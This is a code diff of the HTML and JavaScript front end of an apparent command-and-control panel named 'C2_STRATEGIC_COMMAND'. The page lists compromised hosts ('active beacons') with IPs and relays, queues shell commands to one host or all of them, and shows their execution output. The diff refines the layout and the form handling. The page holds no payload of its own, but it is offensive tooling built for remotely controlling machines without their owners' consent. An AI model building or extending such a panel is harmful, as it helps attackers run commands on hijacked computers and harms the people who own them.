@@ -6,136 +6,138 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; }
-        
-        /* High-Contrast Readability */
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; overflow-x: hidden; }
         .card { background: var(--card); border: 1px solid #333; border-radius: 4px; height: 100%; }
-        .table { color: var(--text); }
-        .table-striped tbody tr:nth-of-type(odd) { background-color: rgba(255,255,255,0.02); }
-        
+        .table { color: var(--text); font-size: 0.9rem; }
         .terminal-box { 
             background: #000; border: 1px solid #444; color: #fff; 
             font-family: 'Consolas', monospace; font-size: 0.85rem;
-            height: 300px; overflow-y: auto; padding: 10px;
+            height: 350px; overflow-y: auto; padding: 10px;
         }
-        
-        .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; }
+        .badge-pending { color: #ff9800; border: 1px solid #ff9800; padding: 2px 5px; font-size: 0.7rem; margin-right: 5px; }
         .text-neon { color: var(--accent); text-shadow: 0 0 5px var(--accent); }
+        hr { border-color: #333; }
     </style>
 </head>
 <body class="p-4">
     <div class="container-fluid">
-        <div class="row mb-3">
-            <div class="col-md-8">
-                <h2 class="text-neon">C2_STRATEGIC_COMMAND <small class="text-muted" style="font-size: 0.9rem;">// ASSET MONITORING</small></h2>
-            </div>
+        <div class="row mb-3 align-items-center">
+            <div class="col-md-8"><h2 class="text-neon m-0">C2_STRATEGIC_COMMAND</h2></div>
             <div class="col-md-4 text-end">
-                <div class="p-2 border border-success">
-                    ACTIVE_BEACONS: <span id="agent-count" class="fw-bold">0</span>
-                </div>
+                <span class="p-2 border border-success">ACTIVE_BEACONS: <span id="agent-count" class="fw-bold">0</span></span>
             </div>
         </div>
 
         <div class="row g-3">
             <div class="col-lg-8">
                 <div class="card p-3">
-                    <h6>LIVE_ASSET_INVENTORY</h6>
+                    <h6 class="text-muted">LIVE_ASSET_INVENTORY</h6>
                     <table class="table table-hover">
                         <thead>
-                            <tr class="text-muted">
-                                <th>HOSTNAME</th>
-                                <th>IP_ADDRESS</th>
-                                <th>RELAY_POINT</th>
-                                <th>LAST_SEEN</th>
-                                <th>STATUS</th>
-                            </tr>
+                            <tr><th>HOSTNAME</th><th>IP_ADDRESS</th><th>RELAY</th><th>LAST_SEEN</th><th>STATUS</th></tr>
                         </thead>
-                        <tbody id="agent-table">
-                            </tbody>
+                        <tbody id="agent-table"></tbody>
                     </table>
                 </div>
             </div>
 
             <div class="col-lg-4">
                 <div class="card p-3">
-                    <h6>OUTBOUND_QUEUE</h6>
-                    <div id="queue-list" class="terminal-box" style="height: 100%;">
-                        </div>
+                    <h6 class="text-muted">OUTBOUND_QUEUE</h6>
+                    <div id="queue-list" class="terminal-box"></div>
                 </div>
             </div>
 
-            <div class="col-lg-6">
+            <div class="col-lg-12">
                 <div class="card p-3">
-                    <h6>INSTRUCTION_UPLINK</h6>
-                    <form action="/admin/send_cmd" method="POST" id="cmd-form">
+                    <h6 class="text-muted">INSTRUCTION_UPLINK</h6>
+                    <form id="cmd-form">
                         <div class="input-group">
-                            <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 150px;">
-                                <option value="ALL">BROADCAST</option>
+                            <select name="target" id="target-select" class="form-select bg-dark text-white" style="max-width: 200px;">
+                                <option value="ALL">BROADCAST_ALL</option>
                             </select>
-                            <input type="text" name="command" class="form-control bg-dark text-white" placeholder="ENTER COMMAND..." required>
-                            <button class="btn btn-outline-success">EXECUTE</button>
+                            <input type="text" name="command" class="form-control bg-dark text-white" placeholder="ENTER COMMAND..." required autocomplete="off">
+                            <button class="btn btn-outline-success">TRANSMIT_CMD</button>
                         </div>
                     </form>
                 </div>
             </div>
 
-            <div class="col-lg-6">
+            <div class="col-lg-12">
                 <div class="card p-3">
-                    <h6>EXECUTION_OUTPUT_FEED</h6>
-                    <div id="results-feed" class="terminal-box">
-                        </div>
+                    <h6 class="text-muted">EXECUTION_OUTPUT_HISTORY</h6>
+                    <div id="results-feed" class="terminal-box" style="height: 400px;"></div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        let seenResultIds = new Set();
+
         async function updateDashboard() {
             try {
                 const response = await fetch('/api/stats');
                 const data = await response.json();
 
-                // 1. Update Count
                 document.getElementById('agent-count').innerText = data.total_count;
 
-                // 2. Update Table
+                // 1. Update Agent Table & Select Dropdown
                 const table = document.getElementById('agent-table');
-                table.innerHTML = '';
                 const select = document.getElementById('target-select');
+                const savedVal = select.value;
                 
-                // Clear and re-fill select except for 'ALL'
-                select.innerHTML = '<option value="ALL">BROADCAST</option>';
+                table.innerHTML = '';
+                select.innerHTML = '<option value="ALL">BROADCAST_ALL</option>';
 
-                for (const [host, info] of Object.entries(data.agents)) {
+                Object.values(data.agents).forEach(agent => {
                     table.innerHTML += `<tr>
-                        <td><b>${host}</b></td>
-                        <td>${info.ip}</td>
-                        <td><span class="text-info">${info.relay}</span></td>
-                        <td>${info.last_seen}</td>
-                        <td><span class="text-success">● ONLINE</span></td>
+                        <td><b>${agent.hostname}</b></td>
+                        <td>${agent.ip}</td>
+                        <td><span class="badge bg-secondary">${agent.relay}</span></td>
+                        <td>${agent.last_seen}</td>
+                        <td><span class="text-neon">● ONLINE</span></td>
                     </tr>`;
-                    
-                    select.innerHTML += `<option value="${host}">${host}</option>`;
-                    
-                    // Update Results Feed if available
-                    if(info.last_result) {
-                        const resFeed = document.getElementById('results-feed');
-                        if (!resFeed.innerHTML.includes(info.last_result)) {
-                            resFeed.innerHTML = `<div><span class="text-warning">[${host}]</span> ${info.last_result}</div>` + resFeed.innerHTML;
-                        }
+                    select.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
+
+                    // 2. Add New Results to History
+                    if (agent.history) {
+                        agent.history.forEach(res => {
+                            if (!seenResultIds.has(res.id)) {
+                                seenResultIds.add(res.id);
+                                const resFeed = document.getElementById('results-feed');
+                                const div = document.createElement('div');
+                                div.className = "mb-2";
+                                div.innerHTML = `<span class="text-muted">[${res.timestamp}]</span> 
+                                                 <span class="text-warning">${res.hostname}</span> 
+                                                 <span class="text-info">></span> <pre style="color:#fff; display:inline;">${res.output}</pre><hr>`;
+                                resFeed.prepend(div);
+                            }
+                        });
                     }
-                }
+                });
+                select.value = savedVal;
 
                 // 3. Update Queue
                 const qList = document.getElementById('queue-list');
                 qList.innerHTML = '';
-                for (const [host, cmd] of Object.entries(data.queue)) {
-                    qList.innerHTML += `<div><span class="badge-pending">PENDING</span> ${host} -> ${cmd}</div>`;
-                }
-            } catch (e) { console.error("Update failed", e); }
+                data.queue.forEach(item => {
+                    qList.innerHTML += `<div><span class="badge-pending">QUEUED</span> ${item.hostname}: ${item.command}</div>`;
+                });
+
+            } catch (e) { console.error("Update loop failed", e); }
         }
 
-        setInterval(updateDashboard, 3000); // Poll every 3 seconds
+        // Handle form without refreshing
+        document.getElementById('cmd-form').onsubmit = async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            await fetch('/admin/send_cmd', { method: 'POST', body: formData });
+            e.target.reset();
+            updateDashboard();
+        };
+
+        setInterval(updateDashboard, 3000);
         updateDashboard();
     </script>
 </body>
